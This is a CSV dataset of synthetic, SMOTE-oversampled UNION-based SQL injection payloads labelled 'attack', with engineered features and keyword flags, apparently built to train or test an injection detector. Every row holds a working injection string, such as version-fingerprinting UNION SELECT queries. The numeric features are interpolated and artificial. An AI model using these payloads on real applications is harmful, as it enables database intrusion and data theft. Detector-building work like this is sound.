id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000064,attack,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",nearest_attack_euclidean,R000012,8.429369702178807e-08,84.0,27.0,3.9211228013533774,46.0,3.0,25.0,10.0,0.5476190476190477,0.03571428571428571,0.2976190476190476,0.11904761904761904,0.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000065,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000003,0.0,76.0,33.0,4.439993102099514,42.0,3.0,17.0,14.0,0.5526315789473685,0.039473684210526314,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000066,attack,union," select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000173,0.08052881156184692,81.61922625361093,33.90480656340273,4.211784488111171,40.0,2.9048065634027322,24.809613126805466,13.904806563402733,0.4901862022913638,0.03554353649752834,0.3039255190834545,0.17034474212765338,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.904806563402732,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000067,attack,union," select * from users where id  =  1 union select !<@,version  (    )   -- 1",nearest_attack_euclidean,R000202,0.18550590137405193,75.32518419053238,27.0,3.914283988564632,40.0,2.3251841905323767,23.0,10.0,0.5310513390138079,0.030831306299800604,0.3053545199329395,0.13276283475345196,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.674815809467623,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000068,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000054,0.1447003070614096,73.0,32.24509737022725,4.379441914776847,42.0,3.0,17.0,11.0,0.5753424657534246,0.0410958904109589,0.2328767123287671,0.1506849315068493,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.245097370227253,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000069,attack,union," select * from users where id  =  1 union select @<@,version  (    )   -- 1",nearest_attack_euclidean,R000080,0.08655023042327807,75.29208734167419,26.29208734167419,3.8949637491904445,40.0,2.292087341674189,23.0,10.0,0.5312835976022864,0.030407434375827325,0.30548806862131467,0.1328208994005716,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000070,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000033,0.26374835265925595,77.0,26.552768665994087,3.934766045364852,40.0,3.0,23.0,11.0,0.5194805194805194,0.03896103896103896,0.2987012987012987,0.14285714285714285,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.447231334005914,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000071,attack,union," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000001,0.7426775477824414,86.96005800193217,26.679980666022608,3.8388430754255527,42.0,4.320019333977391,28.300048334943476,12.339990333011304,0.48350853714888975,0.04936800199192189,0.32488189545850876,0.1422415654006796,3.0,0.0,2.0,0.0,1.0,1.6600096669886955,0.0,2.0,0.0,0.0,1.0,5.339990333011304,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000072,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000172,0.12612566843196582,76.0,26.213813199271627,3.902618446682286,40.0,3.0,23.0,10.0,0.5263157894736842,0.039473684210526314,0.3026315789473684,0.13157894736842105,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.213813199271629,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000073,attack,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.1490134407341553,83.09239876486586,27.0,3.910259384626294,44.78986501982114,3.3025337450447134,25.0,10.0,0.5388151555674818,0.039849447132445384,0.30095385521433765,0.12038154208573507,0.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000074,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000017,8.429369702178807e-08,83.0,29.0,3.9945533084585856,43.0,3.0,25.0,12.0,0.5180722891566265,0.03614457831325303,0.30120481927710846,0.14457831325301204,2.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000075,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000053,0.0,97.0,27.0,3.7712694510833757,49.0,3.0,33.0,12.0,0.5051546391752577,0.030927835051546393,0.3402061855670103,0.12371134020618557,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000076,attack,union,"1'||  (  select 'hvqw' from dual where 4423  =  4423 union all select null,null,null--",nearest_attack_euclidean,R000289,4.2116792360245014,87.78964694850647,28.105176525746764,4.0936557512470895,45.868117840113676,7.210353051493531,22.368940845519408,12.342235211379853,0.5236389449319069,0.08268521187233661,0.25339856777649344,0.14027727541926308,3.0,0.0,2.0,0.4474117371266174,0.4474117371266174,1.4474117371266173,0.0,1.4474117371266173,0.0,0.0,1.5525882628733827,6.342235211379853,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.4474117371266174,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.447411737126617
SMOTE_000077,attack,union," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000019,0.11190417545220299,99.78970264783717,25.0,4.01503349418338,63.05293686378291,4.736765784054273,24.0,8.0,0.6317368969448013,0.04753330356329838,0.2405473496189253,0.0801824498729751,0.0,0.0,2.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,1.0,6.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000078,attack,union," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",nearest_attack_euclidean,R000071,0.0,76.0,27.0,3.933240303308868,40.0,2.0,23.0,11.0,0.5263157894736842,0.026315789473684195,0.3026315789473684,0.14473684210526316,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000079,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000053,0.0,97.0,27.0,3.7712694510833757,49.0,3.0,33.0,12.0,0.5051546391752577,0.030927835051546393,0.3402061855670103,0.12371134020618557,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000080,attack,union,"-5827""  )   as lskq where 7683  =  7683 union all select 7683,7683,7683,7683,7683#",nearest_attack_euclidean,R000223,0.7027736373145758,78.26824520634902,29.119526438095292,4.190218185898789,25.0,29.014596165079222,16.0,8.253649041269806,0.32067985600292587,0.36900627353206766,0.20523510784187254,0.10507876262313394,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.2536490412698056,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000081,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000231,0.3497309137694277,71.7504932822805,25.475886013271047,4.213030623427693,25.637303634504725,26.742126431850515,10.685531607962629,8.685531607962629,0.3556165012019033,0.3723168698439196,0.15035134681579143,0.12171528213838566,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.685531607962629,1.0,1.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000082,attack,union," select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000185,0.06124913799921541,102.06030952454245,26.0,4.081447087451299,62.120619049084894,4.939690475457556,24.030154762271223,10.969845237728778,0.6086504480095236,0.04841128213366877,0.23544762039617703,0.10749064946063051,3.0,0.0,2.0,0.0,1.9698452377287776,2.0,0.0,0.0,0.0,0.0,1.0,5.969845237728778,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000083,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000003,0.0,76.0,33.0,4.439993102099514,42.0,3.0,17.0,14.0,0.5526315789473685,0.039473684210526314,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000084,attack,union,"-7635"" union all select 1284,1284,1284,1284,1284,1284#",nearest_attack_euclidean,R000247,0.8130902509568656,56.75950327505606,22.211570492841126,3.98658304409899,14.0,30.365288521476625,4.0,8.394214753579437,0.2487382772737514,0.5322602092751002,0.0710680792210718,0.14793343423007654,0.0,0.8028926232102814,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.591322130369155,1.0,0.0,0.8028926232102813,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000085,attack,union," select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000127,1.0177532561219573,82.15223624231774,28.576118121158874,4.005469562164092,40.0,3.423881878841126,24.576118121158874,14.152236242317748,0.48697167191838314,0.041755985009201274,0.29912418533366697,0.17214815773874861,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,6.0,1.0,2.7755575615628914e-17,1.0,0.5761181211588746,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000086,attack,union,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",nearest_attack_euclidean,R000203,0.9351971176584061,79.57637659575617,28.730708510639577,4.149295388070903,26.0771659574417,28.768502127674903,15.730708510639575,9.0,0.3297557957929026,0.35893303097312806,0.1979111380454972,0.11340003518847216,1.5385829787208494,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.1921255319187263,2.2692914893604246,1.0,2.7755575615628914e-17,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.2692914893604248,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2692914893604246
SMOTE_000087,attack,union," select * from users where id  =  1 + @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000170,0.5058613923952283,80.3243899283726,29.621949641862997,4.020381721792491,41.297559713490394,2.6756100716274,24.6756100716274,11.675610071627402,0.5140168487568407,0.033345005547079365,0.3072436817161847,0.1453944639798952,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000088,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000295,1.700538612216923,68.07796416478436,19.61559283295687,3.564458522290576,16.01949104119609,35.23118566591374,6.423389249435308,10.403898208239218,0.23501624253433012,0.5198700597253594,0.09022739548062106,0.15488630225968947,0.0,1.0,3.0,0.0,0.0,0.40389820823921796,0.0,0.0,0.0,0.0,6.0,3.4038982082392177,0.0,1.0,1.0,0.0,0.0,0.4038982082392179,0.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.40389820823921796,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4038982082392177
SMOTE_000089,attack,union,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",nearest_attack_euclidean,R000255,0.7773732701139816,80.13079899900015,25.79635784205264,3.957568348287696,23.778147052315838,27.185431368210555,20.370862736421117,8.79635784205264,0.29653743176181807,0.3406435646442642,0.2524312988793719,0.11038770471454586,0.0,0.20364215794736057,3.0,0.0,0.0,1.0,0.0,1.7963578420526394,0.0,0.0,2.7963578420526396,4.0,0.0,0.20364215794736062,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000090,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000017,8.429369702178807e-08,83.0,29.0,3.9945533084585856,43.0,3.0,25.0,12.0,0.5180722891566265,0.03614457831325303,0.30120481927710846,0.14457831325301204,2.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000091,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000033,0.22696777585204458,76.5997629550878,27.0,3.937147025616646,40.0,3.0,23.0,10.599762955087801,0.5222162477437607,0.039166218580782064,0.30027434245266243,0.13834319122279473,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000092,attack,union," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000132,0.35284633037645763,97.3661931876365,25.816903406181748,4.038192990246028,62.0,4.1830965938182505,23.183096593818252,8.0,0.6368109988926935,0.042934041117340865,0.23808579884252115,0.08216916114744434,0.0,0.0,2.0,0.0,1.1830965938182512,2.0,0.0,0.0,0.0,0.0,1.0,5.1830965938182505,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000093,attack,union," select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000139,0.5864652022998986,99.10483622181066,26.473790944547336,3.7095992094665737,49.0,3.0,35.10483622181066,12.0,0.49462723539157677,0.030283300126014892,0.3539562639783487,0.12113320050405962,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.526209055452664,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000094,attack,union,"-4076'   )    )    union all select 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--",nearest_attack_euclidean,R000238,0.7876750365717382,81.58191035246105,21.0,3.5896817899543825,14.0,41.04467837406966,12.52233918703483,14.014892791356553,0.17433302476844303,0.502437305576618,0.15159978149205583,0.17162988816288322,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.7537231978391383,0.0,0.0,8.261169593517415,3.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000095,attack,union," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",nearest_attack_euclidean,R000040,0.07304455995019549,76.0,26.876171985873224,3.9200489410665385,40.0,3.0,23.0,10.0,0.5263157894736842,0.039473684210526314,0.3026315789473684,0.13157894736842105,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.876171985873223,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000096,attack,union," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",nearest_attack_euclidean,R000071,0.0,76.0,27.0,3.933240303308868,40.0,2.0,23.0,11.0,0.5263157894736842,0.026315789473684195,0.3026315789473684,0.14473684210526316,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
